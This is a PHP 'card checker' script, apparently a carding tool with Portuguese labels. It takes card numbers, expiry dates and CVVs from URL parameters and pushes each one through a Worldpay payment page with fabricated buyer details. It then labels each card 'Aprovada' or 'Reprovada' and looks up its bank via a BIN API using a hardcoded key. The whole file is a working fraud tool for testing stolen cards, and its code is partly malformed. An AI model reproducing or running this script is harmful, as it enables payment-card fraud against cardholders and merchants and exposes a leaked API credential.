<?php
class Checker

function value($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function Explicit_Extract($str, $tagIni, $tagEnd)
{
    $arr = explode($tagIni, $str);
    foreach ($arr as $k => $v) {
        $arr[$k] = substr($v, 0, strpos($v, $tagEnd));
    }
    if (empty($arr[0])) {
        unset($arr[0]);
    }
    return $arr[1];
}

function pregMatch($inicio, $final, $conteudo)
{
    preg_match('@' . $inicio . '(.*?)' . $final . '@si', $conteudo, $extract);
    return $extract[1];
}
function data($objeto)
{
    $objeto = explode('-', $objeto);
    $objeto = '' . $objeto[2] . '/' . $objeto[1] . '/' . $objeto[0] . '';
    return $objeto;
}
function percent($num_amount, $num_total)
{
    $count1 = $num_amount / $num_total;
    $count2 = $count1 * 100;
    $count  = number_format($count2, 0);
    return $count;
}
if ($_GET['testar'] == "cc") {
    $ccs       = $_GET['ccs'];
    $separador = $_GET['separador'];
    $id        = $_GET['id'];
    $explode   = explode($separador, $ccs);
    if (substr($explode[0], 0, 1) == '4') {
        $bander = '<font color="#0bbaee"><i class="fa fa-cc-visa" aria-hidden="true"></i></font>';
        $info = 'VISA';
    } elseif (substr($explode[0], 0, 1) == '5') {
        $bander = '<font color="#FF4500"><i class="fa fa-cc-mastercard" aria-hidden="true"></i>';
        $info = 'ECMC';
    } elseif (substr($explode[0], 0, 1) == '3') {
        $bander = '<font color="#137694"><i class="fa fa-cc-amex" aria-hidden="true"></i>';
        $info = 'AMEX';
    } else {
        $bander = '<font color="#ff0000"><i class="fa fa-cc" aria-hidden="true"></font>';
    }
    
    
    $ccn = $explode[0];
    $ccm = $explode[1];
    $ccy = $explode[2];
    $cvv = $explode[3];
    
    $random                = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 6)), 0, 6);
    $random_valor          = rand(1, 9);
    $random_valor_centavos = rand(10, 99);
    
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/card?PaymentID=dWtkYzItcHotcGF5MDctZHBwci0xNTMwNDQwNzczODE3&Lang=en&DispatcherID=ukdc2-pz-pay07&op-PMInitial=");
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/worldpay.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/worldpay.txt');
    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_POST, 0);
    curl_setopt($ch, CURLOPT_REFERER, '');
    
    $b         = curl_exec($ch);
    $PaymentID = value($b, 'NAME=PaymentID VALUE="', '"');
    
    curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/purchase");
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/x-www-form-urlencoded',
        'Connection: Keep-Alive'
    ));
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/worldpay.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/worldpay.txt');
    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_POST, 0);
    curl_setopt($ch, CURLOPT_REFERER, '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'PaymentID='.$PaymentID.'&Lang=pt&authCurrency=GBP&op-DPChoose-'.$info.'^SSL.x=33&op-DPChoose-'.$info.'^SSL.y=14');
    $b1           = curl_exec($ch);
    $cardExp_Time = value($b1, 'name="cardExp.time" value="', '"');
    
    curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/card");
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/x-www-form-urlencoded',
        'Connection: Keep-Alive'
    ));
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/worldpay.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/worldpay.txt');
    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_POST, 0);
    curl_setopt($ch, CURLOPT_REFERER, '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'PaymentID='.$PaymentID.'&Lang=pt&cardNoInput='.$ccn.'&cardNoJS=&cardNoHidden=*oculto*&cardCVV=&cardExp.day=32&cardExp.time='.$cardExp_Time.'&cardExp.month='.$ccm.'&cardExp.year='.$ccy.'&name=iasjdija+'.$random.'&address1='.$random.'+york&address2=&address3=&town='.$random.'+york&postcode=10001&region=&postcode=&country=US&tel=&fax=&email='.$random.'%40ig.com&op-PMMakePayment.x=23&op-PMMakePayment.y=16');
    
    $resultado = curl_exec($ch);
    if  (strpos($resultado, "Obrigado") !== false) {
        $bin = substr($explode[0], 0, 6);
    $bin_item = file_get_contents('https://api.bincodes.com/bin-checker.php?api_key=3e0dcbb752e5b9fea6f087c3d654ad8f&bin=' . $bin . '&format=json');
    $bin_item = json_decode($bin_item, false);
    
    $bank        = $bin_item->bank == '' ? 'N/A' : $bin_item->bank;
    $type        = $bin_item->type == '' ? 'N/A' : $bin_item->type;
    $level       = $bin_item->level == '' ? 'N/A' : $bin_item->level;
    $countrycode = $bin_item->countrycode == '' ? 'N/A' : $bin_item->countrycode;
        echo "<tr><td><font size='1'>$bander</font></td><td><font color='#1ABE88' size='1'>Aprovada</font></td><td><font size='1'>$ccn</font></td><td><font size='1'>$ccm</font></td><td><font size='1'>$ccy</font></td><td><font size='1'>$cvv</font></td><td><font></font><font color='#1ABE88' size='1'>R$: $random_valor,$random_valor_centavos</font></td><td><font size='1'>$type $level | $bank | $countrycode</font></td></tr>";
    } elseif (strpos($resultado, 'You manual order is complete.') !== false) {
        echo "<tr><td><font size='1'>$bander</font></td><td><font color='#1ABE88' size='1'>Aprovada</font></td><td><font size='1'>$ccn</font></td><td><font size='1'>$ccm</font></td><td><font size='1'>$ccy</font></td><td><font size='1'>$cvv</font></td><td><font></font><font color='#1ABE88' size='1'>R$: $random_valor,$random_valor_centavos</font></td><td><font size='1'>$type $level | $bank | $countrycode</font></td></tr>";
    } else {
        echo "<tr><td><font size='1'>$bander</font></td><td><font color='#DA514A' size='1'>Reprovada</font></td><td><font size='1'>$ccn</font></td><td><font size='1'>$ccm</font></td><td><font size='1'>$ccy</font></td><td><font size='1'>$cvv</font></td><td><font></font><font color='#DA514A' size='1'>R$: $random_valor,$random_valor_centavos</font></td><td><font size='1'>$type $level | $bank | $countrycode</font></td></tr";
        
    }
}

?> 
